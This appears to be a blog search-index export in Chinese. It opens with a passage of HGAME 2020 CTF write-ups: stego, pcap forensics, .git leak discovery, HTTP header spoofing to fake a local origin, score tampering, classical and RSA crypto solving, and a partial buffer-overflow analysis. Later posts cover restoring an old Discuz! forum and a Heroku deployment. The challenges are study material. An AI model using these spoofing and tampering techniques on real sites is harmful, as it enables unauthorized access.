EcminrV8dLndN2n91JU4VV96nOmbpoDs2U9avjpc5pu8/upKnCqvtU50xdNIdmyvrV8VLntN1nd9JUYdV9qnOmLppDM2X96nipc9rusztpqrDqPtU5UxfNoZmyfnW81Dlt99mdNFVYdZ/qnKmL5tBMWb86XuqctvvsTpoqrLpPdc7URXNopqxfHS91Ttt9didNFVbdpzpn6qI5NFPWr46XOqftPruTpgrr6vMWxh9K6N5iCBjCSMYfSujeYggYwkjGH0ro3mIIGMJIxh9K6N5iCBjCSMYfSujeYggYwkjGH0ro3mIIGMJIxh9K6N5iCBjCSMYfSujeYggYwkjGH0ro3o43hGQcg0o1NDXddSVroQRDKARDqANDqAFDKARDqANDqAFDKARDqANDqAFDKARDqANDqAFDKARDqANDqAFDKARDqANDqAFDKARDqANDqAFDKARDqANDqAFDKARDqANDqCHaEG553YNyGIcyVrJmt7zteSJujbipsXbjKWMla3bL254n4taImxprN54yVrJmt7zteSJujbipsXbjKWMla3bL254n4taImxprN54yVrJmt7zteSJujbipsXbjKWMla3bL254n4taImxprN54yVrJmt7zteSJujbipsXbjKWMla3bL254n4taImxprN54yVrJmt7zteSJujbipsXbjKWMla3bL257n9pfwCscwlbU5+nTpAf+BukUkHwCGAN9A3SKSDwBDgG+gbhHJB4AhwDdQt4jkA8AQ4BuoW0TyAWAI8A3ULSL5ADAE+AbqFpF8ABgCfAN1i0g+AAwBvtH+p+J2YYblSF1al7bdejhiJe92956thSHY+1TW5ehTWZsjVvJud+/ZWhiCvU9lXY4+lbU5YiXvdveerYUh2PtU1uXoU1mbI1bybnfv2VoYgr1PZV2OPpW1OWIl73b3nq2FIdj7VNbl6FNZmyNW8m5379laGIK9T2Vdjj6VtTliJe92956thSHY+1TW5ehTWZsjVvJud+/ZWhiCvU9lXY4+lbU5YiXvdveerYUh2PtU1uXoU1mbI1bybnfv2VpiQ1DGihYt9FBcenT30J1PnTNVs7UwhJ9IXTSXHt09dOdT50zVbC0M4SdSF82lR3cP3fnUOVM1WwtD+InURXPp0d1Ddz51zlTN1sIQfiJ10Vx6dPfQnU+dM1WztTCEn0hdNJce3T1051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 一看结尾==，应该是base64编码，于是继续解密。 噫是个PNG图片。加上头补全 data:image/png;base64,。草（一种植物），真会玩，是个二维码。 （也可以base64解密后保存为二进制文件然后打开。 扫码得到flag： hgame{3Nc0dInG_@lL_iN_0Ne!} 真的会玩2333（（好，我也要整一个各种编码的嘻嘻嘻 Reference:https://www.qqxiuzi.cn/bianma/kaisamima.phphttps://www.splitbrain.org/services/ook 每日推荐得到一个.pcapng抓包文件，用Wireshark打开，查看http，发现应该是与wordpress博客相关。 利用“文件-导出对象-HTTP”，分析其中的对象。 结合题目提示 ObjectNotFound正听着网易云每日推荐… 发现了一个上传的网页—— 这是一个提交的表格，发现了上传的文件 song.zip，将其提取出来。 压缩包里果然是一首歌，且备注里提示是6位数字。 考虑到6位数字，直接就暴力破解好了。（其实还在抓包文件里找了老半天没找到（（（ 利用口令759371解压得到mp3文件。 一开始打开010editor找，没有。 foremost提取得到了封面图，也没有隐写。 看来在音频里了，猜想就是音频隐写嘛。 既然是MP3，先试试MP3StegoDecode，结果么得。 the bit stream file I Love Mondays.mp3 is a BINARY file HDR: s=FFF, id=1, l=1, ep=on, br=4, sf=3, pd=0, pr=0, m=0, js=0, c=0, o=0, e=0 alg.=MPEG-1, layer=I, tot bitrate=128, sfrq=0.0 mode=stereo, sblim=32, jsbd=32, ch=2 [Frame 3]OpenTable: could not find tables/huffdec Check local directory './tables/' Please check huffman table 'huffdec' 上网找了一下，下了个音频处理软件Audacity。（免费开源跨平台，还不错 Free, open source, cross-platform audio software. Audacity is an easy-to-use, multi-track audio editor and recorder for Windows, Mac OS X, GNU/Linux… 查看频谱，得到flag： hgame{I_love_EDM233} Electronic Dance Music （电子舞曲）可还行。 第一次做音频隐写的题，哇脑洞真大，太有意思了233333 WebCosmos 的博客http://cosmos.hgame.n3ko.co/ 先在网页里找了半天没找到emmm 后来发现，既然说版本管理工具，还有GitHub嘛。 那就构造/.git/config试试 果然—— [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote \"origin\"] url = https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc fetch = +refs/heads/*:refs/remotes/origin/* 好，这个GitHub仓库有戏！ 访问一波，然后在commit里找到了flag。 base64解码得到flag hgame{g1t_le@k_1s_danger0us_!!!!} /.git目录公开访问是挺危险的emmm 接 头 霸 王http://kyaru.hgame.n3ko.co/ 直接访问，提示 You need to come from https://vidar.club/. 增加请求头: Referer: https://vidar.club/，重发后提示 You need to visit it locally. 增加请求头：X-Forwarded-For: 127.0.0.1 You need to use Cosmos Brower to visit. 改UA：User-Agent: Cosmos The flag will be updated after 2077, please wait for it patiently. 根据响应头 Last-Modified: Fri, 01 Jan 2077 00:00:00 GMT，进行修改。把 If-Unmodified-Since 设置在 Last-Modified 之后就可以了。 增加请求头：If-Unmodified-Since: Fri, 01 Jan 2077 00:00:00 GMT 得到flag hgame{W0w!Your_heads_@re_s0_many!} 这题一波三折啊。 最后这个操作让我想到了ustc的hackgame里信息安全 2077那道题，然后回去看了一下233. Reference： https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8_2077/README.md 🐔尼泰玫cxk有点好玩2333 随便玩了一下觉得有点无聊（x 看了一下网页源代码，发现是用canvas画布画出来的，交互用的js，有点意思i。 然后打开了Burp Suite，抓个包看看吧。 发现游戏结束的时候会POST当前得分。 不够则提示 Your score must more than 30000 , then you can get the flag. Happy game! 那就截包改包好了啦，直接给他加个0. 这就出来了呀！ ​ hgame{j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!} Code Worldhttp://codeworld.hgame.day-day.work/ 发现重定向到了 http://codeworld.hgame.day-day.work/new.php 同时看到了一句js console.log(\"This new site is building....But our stupid developer Cosmos did 302 jump to this page..F**k!\") curl看了一下之前的网页405。 嘤不会了。。 20200125更新： 看了官方WP，发现要把请求改成POST发到原页面。 于是试了一下，返回 人鸡验证 目前它只支持通过url提交参数来计算两个数的相加，参数为a 现在,需要让结果为10 再构造参数a，根据提示参数a的提交格式为: 两数相加(a=b+c)，考虑到+的Urlencode为%2b 于是构造/?a=2%2b8，得到flag The result is: 10 hgame{C0d3_1s_s0_S@_sO_C0ol!} CryptoInfantRSA题目给了如下的代码—— #!/usr/bin/env python3 from secret import flag assert flag.startswith(b'hgame{') and flag.endswith(b'}') m = int.from_bytes(flag, byteorder='big') p = 681782737450022065655472455411 q = 675274897132088253519831953441 e = 13 c = pow(m, e, p*q) assert c == 275698465082361070145173688411496311542172902608559859019841 RSA啦。这里就根据密文C把明文M给找出来。 c = 275698465082361070145173688411496311542172902608559859019841 n = 460390767897997184102969941508880171690097589571068900519251 d = 141658697814768364339375366617699419709389378231351875726277 m = pow(c,d,n) # 得到m为39062110472669388914389428064087335236334831991333245 # 再将数字m转换为字符串 import binascii flag = binascii.unhexlify(hex(m)[2:]) 或者 用上面的工具里的Test： 得到flag： hgame{t3Xt6O0k_R5A!!!} Reference: 介绍RSA的https://www.freebuf.com/articles/others-articles/166049.htmlhttps://www.freebuf.com/articles/others-articles/161475.htmlhttps://www.k2zone.cn/?p=2157 Reordernc 47.98.192.231 25002 敲个回车就可以得到一个乱序的字符串，刚开始还以为是分组来着，然后试了半天不对emmm。 后来才发现，原来每次的结果都不一样233，比如下面是一些实验结果。 Rua!!! $hLjgp+ame{UI5mtA3}u_!iP!RmTn0eT Rua!!! $mtgIUeapjm{h+5LAeT_nTRP!u!m3i0} Rua!!! t5m{ag+eh$UjILmpT0!mP_iR3ATun}e! $mhmjI5te+{apUgLAe3!un0TRimP!T_} mat5jIpmg$heLU{+!PT0un!e_A3R}Tmi {LUpt5mI+e$mgajhm}T!T0!niRAe_Pu3 $Umm+g{LIe5jphtaAT!ei_m}nR0u!3TP 5I{eLmt+ha$mgpjU0nmR}eTi3PA!_!uT Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R 既然是乱序吧，那就看看到底是什么个顺序好了！ 上面字符串的长度为32，于是构造字符串 str1='123456abcdefghijklmnopqrstuvwxyz' 输入后得到 str2='jhca1346ibdefg25zxsqkmnpyrtuvwlo' 试了发现该顺序不变，于是得到编码的对应关系（正变换逆变换嘛233333） str1='123456abcdefghijklmnopqrstuvwxyz' print(len(str1)) str2='jhca1346ibdefg25zxsqkmnpyrtuvwlo' # 正变换 location=list(range(len(str1))) for i in range(len(str2)): location[i]=str1.index(str2[i]) print(location) # [15, 13, 8, 6, 0, 2, 3, 5, 14, 7, 9, 10, 11, 12, 1, 4, 31, 29, 24, 22, 16, 18, 19, 21, 30, 23, 25, 26, 27, 28, 17, 20] # 逆变换 ilocation=list(range(len(str1))) for i in range(len(str2)): ilocation[i]=str2.index(str1[i]) print(ilocation) # [4, 14, 5, 6, 15, 7, 3, 9, 2, 10, 11, 12, 13, 1, 8, 0, 20, 30, 21, 22, 31, 23, 19, 25, 18, 26, 27, 28, 29, 17, 24, 16] # 验证结果 str3='' for i in location: str3+=str1[i] print(str3) # jhca1346ibdefg25zxsqkmnpyrtuvwlo 这里用到的是正变换，暴力破解一波吧！ str_encrypted = r'Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R' str_decrypted = '' for _ in range(80): for i in location: str_decrypted += str_encrypted[i] print(str_decrypted) str_encrypted = str_decrypted str_decrypted = '' 最开始试了50次没出来233，后来把数字改大了一点233. 终于跑出来了！ 得到flag： hgame{jU$t+5ImpL3_PeRmuTATi0n!!} 果然就排列呗23333 还试了一下，这个130次一循环来着emmm。就这样，发现range改到131就出现两个了。 str_encrypted = r'Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R' str_decrypted = '' for _ in range(130): for i in location: str_decrypted += str_encrypted[i] if str_decrypted.startswith('hgame'): print(str_decrypted) str_encrypted = str_decrypted str_decrypted = '' 不对唉！好像没这么简单。重新试了一下之前的几个Rua!!!之后的结果，发现这个变换不可行emmm。 必须是连续输入上一次出来的结果才行。（可能理解有误 Affine题目给了这段用来加密的代码，现在就想办法还原回去找flag吧。 #!/usr/bin/env python3 # -*- coding: utf-8 -*- import gmpy2 from secret import A, B, flag assert flag.startswith('hgame{') and flag.endswith('}') TABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM' MOD = len(TABLE) cipher = '' for b in flag: i = TABLE.find(b) if i == -1: cipher += b else: ii = (A*i + B) % MOD cipher += TABLE[ii] print(cipher) # A8I5z{xr1A_J7ha_vG_TpH410} 提示了flag以 hgame{ 开头，以 } 结尾，很明显能看出来{ } _这三个字符是找不到而直接加到cipher里的。 容易得到 MOD=62，于是乎思路就是，利用 hgame 与 A8I5z 的映射关系，把A和B两个参数给求解出来，再把参数i反解出来，最后把flag还原。 码代码吧。 TABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM' MOD = len(TABLE) # 62 flag = 'hgame' cipher = '' for b in flag: i = TABLE.find(b) print(b, i) # 求解得到对应的i # h 12 # g 11 # a 7 # m 6 # e 18 str_encrypt = r'A8I5z{xr1A_J7ha_vG_TpH410}' iis = list(range(5)) i = 0 for letter in str_encrypt[0:5]: iis[i] = TABLE.index(letter) print(letter, iis[i]) i += 1 # 求解得到对应的ii # A 46 # 8 33 # I 43 # 5 30 # z 0 得到了字母对应的i和ii，而**i与ii满足关系 (A*i+B) % 62 = ii**，从而可以把A、B解出来。 查了查模逆运算，看了看觉得有点麻烦emmm 猜想A、B不会太大，干脆直接遍历好了。。 for A in range(1, 62): for B in range(1, 62): if (12*A+B) % 62 == 46 and (11*A+B) % 62 == 33 and (7*A+B) % 62 == 43 and(6*A+B) % 62 == 30 and(18*A+B) % 62 == 0: print(\"Yes: \", A, B) # Yes: 13 14 得到A=13，B=14. 接下来还原flag。 # Begin to decrypt... A = 13 B = 14 str_encrypt = 'xr1AJ7havGTpH410' str_decrypt = '' for letter in str_encrypt: ii = TABLE.index(letter) for i in range(62): temp = (A*i + B) % 62 if temp == ii: print(i, TABLE[i]) str_decrypt += TABLE[i] print(str_decrypt) # M4thu5EdiNcRYpt0 # So the flag is `hgame{M4th_u5Ed_iN_cRYpt0}`. 这里先把_给去掉了，最后再加上。 于是乎flag就是： hgame{M4th_u5Ed_iN_cRYpt0} 看来果然是数学啊2333，还想看看大佬们怎么用数学方法解出来的。（（ 如题目所言—— Some basic modular arithmetic… Reference: 一点关于模逆运算的介绍，后面有空再看看吧（x https://blog.csdn.net/lion19930924/article/details/61926019 PwnHard_AAAAAnc 47.103.214.163 20000 IDA分析一波，发现是memcmp比较，backdoor函数里是执行/bin/sh的。 其中s与v5距离为 -31h-(-ACh)=123，构造payload发了个\"0O0o\"过去，发现么得。 int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+0h] [ebp-ACh] char v5; // [esp+7Bh] [ebp-31h] unsigned int v6; // [esp+A0h] [ebp-Ch] int *v7; // [esp+A4h] [ebp-8h] v7 = &amp;argc; v6 = __readgsdword(0x14u); alarm(8u); setbuf(_bss_start, 0); memset(&amp;s, 0, 0xA0u); puts(\"Let's 0O0o\\\\0O0!\"); gets(&amp;s); if ( !memcmp(\"0O0o\", &amp;v5, 7u) ) backdoor(); return 0; } 20200125更新： 看了官方WP，草（一种植物），好气啊，\\x00把字符串识别隔断了。 未完待续（可能会咕咕咕","path":"2020/01/23/CTF_Hgame2020/"},{"title":"小想法 | 重建那些年基于Discuz!系统搭建的满是回忆的班级网站","text":"2020年第一篇哈，先祝大家新年快乐，每天都有新收获喵！ 哇呜！今天终于下了今年的第一场雪，贼惊喜~（然而积不起来啊嘤嘤嘤 前言 最近期末考试月忙死了，刚考完一科，难得有空来浪一下。考完一科浪两天然后作死复习的是我了emmm嘤嘤嘤。 有一次和奶冰冰聊天，回忆起之前折腾过的、搭建过的各种网站，而后就想到了N年以前搭建的班级网站。 （很明显，那时候提供网络服务的各种空间、域名什么的到现在没几个还能用的了。 2017年10月的时候，我的邮箱突然收到了一封来自Red Hat的邮件，提醒我OpenShift Online v2 End of Life了。↓ 那时候感觉特别惊喜，毕竟到那时已经放在那上面四五年了，我都差点忘记它的存在了。虽然域名早就炸了，但是这个免费的云平台居然还在（这个角度看来 Red Hat 还是挺可靠的233）。 那时就登上去看了一下，哇呜数据居然都还在，通过默认的域名还访问到了网站，于是好怀念啊，为了留个纪念就截了个图。 N年前先建了10班的班网论坛，（分班后）又建了个8班的班网。 ​ 几天之后，果不其然，Unavailable了。 不过还好那时候就有备份的好习惯（不是），试了几个密码登录进了8班的班网，然后把数据库给备份下来了，不过也只备份了数据库，附件啊头像啊这些就没备份下来。10班的班网（更是由于记不得密码了）就没成功备份emmm。 于是现在就觉得有点遗憾，通过phpMyAdmin其实可以直接导出数据库的；在重建的时候知道通过修改数据库可以把创始人密码修改的。 但那时候不大清楚这些，也有可能是那时连服务器密码都不记得了（（（ 最近这几天就想，干脆试一下，看看能不能重建那时候的班网吧。 重建折腾记辣鸡服务器配置出了一堆问题之前都没有自己动手在裸机上配置WEB环境来着，Linux也没有多少经验，于是乎上手就比较痛苦。 下面是一堆废话emmm 不想看就直接跳过这节吧。 租服务器的时候图省事直接装了PHPStudy，里面集成了LNMP环境，然后网站什么的直接可以在上面配置。 之前搭了几个测试用的网站，运行都没什么问题，能正常访问。 然而这次我建了一个新的PHP环境，打开端口，访问的时候居然报403无权限，但是其他的网站都没这个问题。 看到网页上是nginx报的错，很自然怀疑就是它的问题。检查了一下配置没发现问题，于是重装了一下。这回直接报500内部服务器错误了。（我愣住了 看了一下错误log，发现很多是无权限，还有的找不到文件？？？ 复制粘贴搜了一下，怀疑是动态链接库的问题，于是ln尝试创建链接，然而不成功。 然后不想管了，关闭nginx服务，启动apache服务，这回还是403，其他的网站就没问题，绝了。 换回nginx，将配置文件中的user由www更改为root，再试居然好了！看来果然是权限的问题，然而我之前好像并没有改过什么配置，也不清楚www用户为啥就没权限了。 root毕竟不太安全吧，于是又改了回去，403了。 登录服务器看了一下，几个网站目录下就只有新建的这个用户组是root，修改了目录权限，允许others执行，再访问，没问题了。 但很奇怪啊为啥就不行啊。 于是又重装了一次nginx，同时还卸掉了它的防火墙，这次没问题了emmm。再装回防火墙，又炸了。 WAF的问题啊。 这时候后台改参数也有报无权限的，就很懵逼。 于是干脆直接reboot好了。 （有句话说得好，重启解决绝大部分问题 进入后台，先关闭nginx，重装WAF，再开启nginx。这回终于没毛病了。（x 重建8班班网重建其实类似于搬家，于是看了几篇关于Discuz!搬家的教程，发现距今都有一段历史了。 去官方论坛找到了最新的X3.4版本的下载链接，发现指向了gitee，刚开始还觉得有点意思，然而当我点开链接发现连接不上gitee服务器，难道炸了？？？换了一个网络，连上了。（吐槽一下辣鸡宽带，估计是DNS出了点问题8 啊不是！！！ 别想着啥都想装最新的，得先考虑你要重建/恢复的系统是什么版本的啊！还要注意PHP的版本，以及语言编码（GBK/UTF8/BIG5/？）（就因为这个删掉又重建了好几个版本 论坛的版本可以在你备份的数据库.sql文件头部注释里看到。（这个还是后面重建10班班网时才发现的 不要像我一样装了发现用不了嘤嘤嘤。 upload文件夹打包传到服务器上，解压，然后访问网站。 草怎么又403了。 检查了一下文件发现是root所属，原来是之前一直以root身份操作的问题，更改用户组为www，这回能正常访问了。 按照安装流程全新安装Discuz!系统。这里的数据库要自己提前建好，表前缀和你要重建的一致，一般就不用更改。 安装完成，访问主页是默认的界面。（略） 根据官方的搬家教程，把utility/restore.php文件上传到网站的data/目录下，再把要恢复的数据库整个目录也上传到data/下，然后通过网站域名/data/restore.php访问数据恢复页面。 然而这里我被自己的WAF给拦住了233。 开了白名单再导入，这时候过了一段时间报504了emmm。（我又懵了，难得让我见到了好多错误页面，我没事的嘤嘤嘤 重试，如旧，同时发现cpu是100%在跑的（唉性能果然不咋样。 搜了各种资料，把nginx的超时和PHP执行时间都改了，还是504… 看了一下.sql文件，干脆不用整个工具，直接导入mysql好了啦。 虽然期间还报了几个错，但还是导完了呢。 访问主页，哇好惊喜啊，之前的分类、帖子什么都回来了。 用原始的创始人账号登录后台，更新缓存。 这里也折腾了老半天，不是安装论坛系统时候创建的，而是重建的老用户。 毕竟整个数据库都改回去了嘛。 至于忘记密码，emmm后面再说。 再刷新主页，这回数据基本能正常访问了，页面配置也恢复到了之前的状态。 （如果有的话）恢复logo、favicon、attachment、avatar、plugin、template等。 这里由于之前只备份了logo，其他数据基本没备份（或者说我的硬盘里没备份）emmm，就么的办法了。 看了看上面的帖子，全是黑历史啊……（黑脸.png 用户数据都恢复了，理论上能用原来的信息进行登录。 然而图片什么的都没了，之前很多外链的图片、插件都失效了，其实问题也不大吧。 不过能重建了也总比没有要好呀！嘻嘻嘻。 毕竟这个版本有很多安全漏洞了，出于安全考虑，这里就不公开了啦。 重建10班班网上面说了云平台End of Life的时候没有备份这个数据的。 但是我找遍了硬盘，终于翻出了那时候备份的部分数据。 有了上面重建的经验，本以为就很轻松上手的，没想到还是遇到了一堆问题。 首先还是版本的问题。 本以为X3.2版本已经够老了，没想到这里最后一直回退到了**X2版本**（噗 鬼懂得我重建了多少次网站emmmm 期间有一次是PHP版本错了，毕竟之前的版本一般只支持5.x来着，然后我装了7.x。 有一次是MySQL数据库炸了，装完之后主页都打不开，直接报的database error。然后卸掉了数据库，换了老一点的版本，发现装好了永远启动不了。最后发现是之前卸载有残留，绝了。清了一遍残留重装，再重启服务就好了。 还有一次是Discuz版本装的X2.5，本来挺开心的，导完数据更新完缓存，点开帖子就报database error，说找不到某某记录吧。最后版本降到X2终于好了，估计是版本升级过程中修改了这部分数据库或操作数据库的代码吧。 还有每一次都遇到了**.sql导不进数据库**的问题，因为这个数据库更大了，即使改了nginx和PHP的配置，在网页上导入还是永远报504，最后是一边看着CPU状态，一边从后台导入的。前端报了504，CPU还在跑，虽然SQL还报过好几种错但最后还是导入完成了。。（我太难了 噢还有那个创始人密码忘了的问题。 查了一下资料，一个方案是尝试登录UC_Center，如果成功登录的话可以在里面更新创始人的密码，再用更新后的密码登录Discuz的管理后台就行了。（这里用的就是这个方案） 另一个方案是修改数据库里面的用户相关的表，先改成一个比较简单的密码（好像是MD5加密），登录进去再修改。这里没用试过就不说了啦。 重建完成之后访问主页。 草，原来这个是那时候更新版本前的最后一次备份emmm （看亚子是第四代，最后更新的是第五代了，看了半天才想起来） 找了一下发现部分附件和头像之类的也有备份（更古老的数据了）。于是又折腾了一会儿把能恢复的数据给恢复了。 于是乎最后重建出来的是2013年1月的备份了。 怎么说好呢，其实问题也不大吧，真·回忆啊！ 这个版本的安全漏洞更多了，同样就不公开了，看看就好了啦。 emmm下面这个是恢复不了的第五代版本（真就只有这张图了嘤嘤嘤）。 一些想法 Linux权限管理还是很严格的，这回体验到了，有空再研究研究。 选对合适的版本，不要总想着用最新的。 看了Discuz!系统之前的老版本，都是把GBK编码的版本放在前面，不过现在都是推荐安装UTF-8编码版本了。 包括其他很多地方基本上就UTF-8了，感觉也算是个趋势吧，毕竟是国际编码，通用性强嘛。 去Discuz!官方论坛看了看，感觉明显冷清了。包括在后台看插件应用市场，基本上就变成了商业化的交易了，就有点怀念N年前那时候社区还很活跃，有一堆免费的还互相分享来着。（不过也算是时代趋势吧233 其实还找到了以前可能折腾过的各种建站系统233。 然后就想到纸飞机了嘤嘤嘤。今天去看了一下，发现纸飞机还能访问i，只是论坛关闭了，个人空间和视频区还是开放的，而且版本是X3.4算是最新的大版本了。（不知道于老板是不是还维护过 写这篇blog的时候又去OpenShift看了一下，发现现在都升级到 V4.2 版本了。增加了很多现在很实用很热门的Serverless、 CI/CD之类的，现在的Starter plan也是免费的，不过感觉加了不少限制吧（毕竟减少滥用节约资源嘛）。感兴趣的还可以看看下面的链接。 版本介绍：https://blog.openshift.com/introducing-red-hat-openshift-4-2-developers-get-an-expanded-and-improved-toolbox/ 产品介绍：https://www.openshift.com/products/online/ ​ 备份是个好习惯，CTRL+S也是。 看了看之前的帖子，发现全都是黑历史…… 然后惊喜地发现，之前的外链难得有几个还能访问，进去一看发现是以前的教育博客，居然一直运营到了现在，而且以前的文章都在。全是回忆啊。。 等我有空再把上面以前发的文章爬下来备份一份23333. 有问题欢迎来交流哈哈哈。 溜了溜了喵","path":"2020/01/09/Idea_RebuildClassWebsite/"},{"title":"NUAA_iCal_Web在线版本部署","text":"主要是简单记录一下Heroku的部署，毕竟一不小心就忘记该怎么折腾的了… （其实应该两周前写这篇blog的，现在已经忘了很多了嘤嘤嘤 Cause之前折腾了一两个月，做了个把课表导出到ical日历文件的小jio本，即 NUAA_ClassScheduleGitHub链接：click herehttps://github.com/miaotony/NUAA_ClassSchedule 其中有一个TODO是搭建一个web端，实现在线导出。 实际上，在教务系统加入验证码之前，已经和奶冰一起做了一个可以用的web端了，只不过只是简单测试还没公开啥的。 然而，这个验证码一加就麻烦了……之前做的登录显然就不成功了。 解决方案的话，在本地，是通过把验证码下载下来，PIL调用本地图片查看器来显示，进而在命令行里输入。 不过web端就有点麻烦了。 但怎么说好呢，不妨碍用同样的思路解决这一问题呢嘻嘻嘻。后面再说。 其实到写这篇blog为止还没弄清楚他验证码的具体机理。（等我考完试有空再折腾好了喵 不想往下看又想体验NUAA_iCal_Web在线版本的，点这里访问吧。 DeployHeroku简介偶尔有一天在转GitHub的时候，看到某个项目下有个网页端的界面，README里面也有个deploy with heroku之类的图标按钮。点进去看了看，然后再查了查资料。 Heroku is a platform as a service (PaaS) that enables developers to build, run, and operate applications entirely in the cloud. Heroku是一个支持多种编程语言的云平台即服务。在2010年被Salesforce.com收购。Heroku作为最开始的云平台之一，从2007年6月起开发，当时它仅支持Ruby，但后来增加了对Java、Node.js、Scala、Clojure、Python以及（未记录在正式文件上）PHP和Perl的支持。基础操作系统是Debian，在最新的堆栈则是基于Debian的Ubuntu。 好东西呀！ 发现heroku可以在一定程度上免费搭建网站，当然前提是要有一个wsgi接口之类的，大概意思就是说需要让你的东西能通过网络访问得到。 其实那时候我连wsgi是啥都不知道…… 官网链接：https://www.heroku.com/ 具体的定价策略参见这里。 